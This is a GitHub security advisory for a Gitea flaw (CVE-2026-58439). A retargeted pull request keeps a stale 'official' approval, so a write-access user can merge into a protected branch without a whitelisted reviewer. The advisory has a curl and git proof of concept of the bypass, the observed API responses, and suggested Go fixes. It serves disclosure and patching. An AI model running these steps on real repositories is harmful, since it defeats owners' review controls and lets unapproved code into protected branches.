# [H] Gitea: Branch Protection Bypass via PR Retargeting Preserves Stale `official` Approval Flag

## Summary
Severity: High
Advisory: GHSA-w5pg-649r-p6gg
CVE: CVE-2026-58439
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-w5pg-649r-p6gg
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
## Summary

Gitea does not re-evaluate the `official` flag on existing pull request reviews when a PR's target branch is changed. An attacker with write access to a repository can obtain an `official: true` approval on a PR targeting an unprotected branch, then retarget the PR to a protected branch (e.g., `master`). The approval, which would have been `official: false` if submitted against the protected branch, is preserved and satisfies the protected branch's required approvals, allowing the attacker to merge without legitimate maintainer approval.

- Confirmed on Gitea **1.25.4** (`1.25.4+41-g96515c0f20`)

## Vulnerability Details

### Root Cause

When a review is submitted on a pull request, Gitea computes the `official` flag by checking whether the reviewer is in the **target branch's** approval whitelist (`IsUserOfficialReviewer` in `models/git/protected_branch.go`). This flag is stored in the database as a boolean on the review record.

When a PR's target branch is subsequently changed via `ChangeTargetBranch` (`services/pull/pull.go:218`), the function:
- Updates `pr.BaseBranch`
- Recalculates merge feasibility and divergence
- Deletes old push comments
- Creates a "change target branch" comment

But it does **not**:
- Re-evaluate `official` on existing reviews
- Dismiss existing approvals
- Check whether reviewers are in the new target branch's approval whitelist

At merge time, `GetGrantedApprovalsCount` (`models/issues/pull.go:766`) counts reviews where `official = true AND dismissed = false AND type = Approve`. It reads the stored boolean — it does not re-check the whitelist. The stale `official: true` from the unprotected branch satisfies the protected branch's approval requirement.

### Relevant Code Paths

1. **Review creation** — `services/pull/review.go:SubmitReview` calls `IsOfficialReviewer` against the current `pr.BaseBranch`'s protection rules, stores `official=true/false`
2. **Target branch change** — `services/pull/pull.go:ChangeTargetBranch` modifies `pr.BaseBranch` but does not touch existing reviews
3. **Merge check** — `services/pull/check.go:CheckPullMergeable` → `models/issues/pull.go:GetGrantedApprovalsCount` counts stored `official=true` reviews without re-evaluating against the new branch's whitelist

### Prerequisites

The attacker needs:
- **Write (push) access** to the repository (collaborator with write role, or the ability to create branches — not admin)
- The ability to create pull requests (standard for any user with push access)
- A second account (or any non-admin account) to submit the approval on the unprotected branch

The attacker does **not** need:
- Admin access
- To be in the approval whitelist for the protected branch
- Any interaction from the branch protection's designated approvers

## Proof of Concept

### Setup

Repository `owner/repo` with branch `master` protected:
- Required approvals: 1
- Approval whitelist enabled, containing only user `admin-reviewer`
- User `attacker` has write access but is **not** in the approval whitelist

### Steps

```bash
BASE="http://gitea-instance:3000"
OWNER="owner"
REPO="repo"
ATTACKER_AUTH="attacker:password"
ACCOMPLICE_AUTH="accomplice:password"  # any non-whitelisted user

# 1. Create an unprotected temporary branch from master
curl -X POST "$BASE/api/v1/repos/$OWNER/$REPO/branches" \
  -u "$ATTACKER_AUTH" \
  -H "Content-Type: application/json" \
  -d '{"new_branch_name": "tmp-unprotected", "old_branch_name": "master"}'

# 2. Push a malicious commit to a feature branch
git checkout -b malicious-branch origin/master
echo "malicious payload" > payload.txt
git add payload.txt
git commit -m "innocent looking commit"
git push origin malicious-branch

# 3. Create PR targeting the UNPROTECTED branch
curl -X POST "$BASE/api/v1/repos/$OWNER/$REPO/pulls" \
  -u "$ATTACKER_AUTH" \
  -H "Content-Type: application/json" \
  -d '{
    "head": "malicious-branch",
    "base": "tmp-unprotected",
    "title": "Add feature"
  }'
# Returns PR #N

# 4. Approve the PR (official=true because tmp-unprotected has no protection)
curl -X POST "$BASE/api/v1/repos/$OWNER/$REPO/pulls/N/reviews" \
  -u "$ACCOMPLICE_AUTH" \
  -H "Content-Type: application/json" \
  -d '{"event": "APPROVED", "body": "LGTM"}'
# Response includes: "official": true

# 5. Retarget the PR to protected master
curl -X PATCH "$BASE/api/v1/repos/$OWNER/$REPO/pulls/N" \
  -u "$ATTACKER_AUTH" \
  -H "Content-Type: application/json" \
  -d '{"base": "master"}'

# 6. Verify: approval is still official=true against master
curl "$BASE/api/v1/repos/$OWNER/$REPO/pulls/N/reviews" \
  -u "$ATTACKER_AUTH"
# Response: "official": true, "dismissed": false, "stale": false

# 7. Merge — succeeds despite no whitelisted approver reviewing
curl -X POST "$BASE/api/v1/repos/$OWNER/$REPO/pulls/N/merge" \
  -u "$ATTACKER_AUTH" \
  -H "Content-Type: application/json" \
  -d '{"do": "merge"}'
# Returns 200 OK — malicious commit is now on master
```

### Observed API Responses

**Step 4** — Approval on unprotected branch:
```json
{"id": 16, "state": "APPROVED", "official": true, "dismissed": false, "user": {"login": "accomplice"}}
```

**Step 6** — Same approval after retarget to protected master:
```json
{"id": 16, "state": "APPROVED", "official": true, "dismissed": false, "stale": false, "user": {"login": "accomplice"}}
```

The `official` flag is unchanged. Under the protected branch's rules, this user's approval should be `official: false`.

## Impact

- **Branch protection bypass**: Protected branches with approval whitelists can be merged into without any whitelisted user approving
- **Privilege escalation**: A user with write-but-not-admin access can effectively nullify the admin-configured approval requirements

## Suggested Fix

Re-evaluate the `official` flag on all existing reviews when a PR's target branch changes. In `services/pull/pull.go:ChangeTargetBranch`, after updating `pr.BaseBranch`:

```go
// After updating the base branch, re-evaluate official status on all reviews
reviews, err := issues_model.FindReviews(ctx, issues_model.FindReviewOptions{
    IssueID: pr.IssueID,
    Type:    issues_model.ReviewTypeApprove,
})
if err != nil {
    return err
}

newProtectBranch, err := git_model.GetFirstMatchProtectedBranchRule(ctx, pr.BaseRepoID, targetBranch)
if err != nil {
    return err
}

for _, review := range reviews {
    wasOfficial := review.Official
    if newProtectBranch != nil && newProtectBranch.EnableApprovalsWhitelist {
        review.Official = git_model.IsUserOfficialReviewer(ctx, newProtectBranch, review.Reviewer)
    } else {
        review.Official = false
    }
    if wasOfficial != review.Official {
        if _, err := db.GetEngine(ctx).ID(review.ID).Cols("official").Update(review); err != nil {
            return err
        }
    }
}
```

Alternatively, dismiss all existing approvals on retarget (simpler, more conservative):

```go
// Dismiss all approvals when target branch changes
if _, err := issues_model.DismissReview(ctx, &issues_model.DismissReviewOptions{
    IssueID: pr.IssueID,
    Message: "Dismissed: PR target branch changed",
}); err != nil {
    return err
}
```

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-w5pg-649r-p6gg
- https://github.com/go-gitea/gitea/pull/38319
- https://github.com/go-gitea/gitea/pull/38402
- https://github.com/go-gitea/gitea/commit/74ad781db9c37134ee9280c69a6b1de53801503e
- https://github.com/go-gitea/gitea/commit/8401fe7c544abff1ecc49d7f3166fd4ee0c174ef
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
